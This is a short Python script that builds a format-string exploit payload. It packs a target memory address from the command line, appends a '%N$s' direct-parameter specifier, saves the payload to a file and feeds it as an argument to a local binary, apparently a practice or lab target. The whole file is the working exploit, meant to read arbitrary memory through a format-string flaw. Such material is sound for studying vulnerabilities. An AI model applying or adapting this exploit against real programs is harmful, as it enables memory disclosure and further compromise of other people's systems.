import sys
import struct
from subprocess import Popen

target_addr = int(sys.argv[1], 16)
index = int(sys.argv[2])

buf = struct.pack('<I', target_addr)
print('type %s' % type(buf))
s = "%%%d$s" % index
buf += s.encode()
print('buf %s' % buf)

path = './resources/buf.txt'

with open(path, 'wb') as f:
    f.write(buf)

p = Popen(['./a.out', buf])
p.wait()
